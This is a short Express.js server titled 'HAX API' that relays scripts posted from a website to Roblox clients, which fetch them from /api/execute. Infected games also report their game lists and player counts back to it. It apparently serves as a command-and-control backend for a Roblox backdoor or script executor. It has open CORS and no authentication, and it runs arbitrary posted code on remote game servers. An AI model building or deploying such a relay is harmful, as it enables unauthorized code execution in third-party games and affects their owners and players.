const express = require('express');
const app = express();

// Enable CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.text());
app.use(express.json());

let latestScript = "";
let gamesData = [];
let globalPlayers = 0;

// Website POSTs script here
app.post('/api/execute', (req, res) => {
    latestScript = req.body;
    console.log('Script received:', latestScript.substring(0, 50) + '...');
    res.send('Script stored');
});

// Roblox GETs script from here
app.get('/api/execute', (req, res) => {
    res.send(latestScript);
    latestScript = ""; // Clear after sending
});

// Roblox POSTs game data here
app.post('/api/games/update', (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        gamesData = data.games || [];
        globalPlayers = data.globalPlayers || 0;
        console.log('Games updated:', gamesData.length, 'games,', globalPlayers, 'players');
        res.send('OK');
    } catch (e) {
        console.error('Error parsing game data:', e);
        res.status(400).send('Invalid data');
    }
});

// Website GETs game data here
app.get('/api/games', (req, res) => {
    const total = gamesData.length;
    const active = gamesData.filter(g => g.players > 0).length;
    
    res.json({
        total: total,
        active: active,
        players: globalPlayers || 0,
        games: gamesData
    });
});

// Health check
app.get('/', (req, res) => {
    res.send('HAX API Running - ' + new Date().toISOString());
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`HAX Server running on port ${port}`);
    console.log(`API URL: http://localhost:${port}`);
});
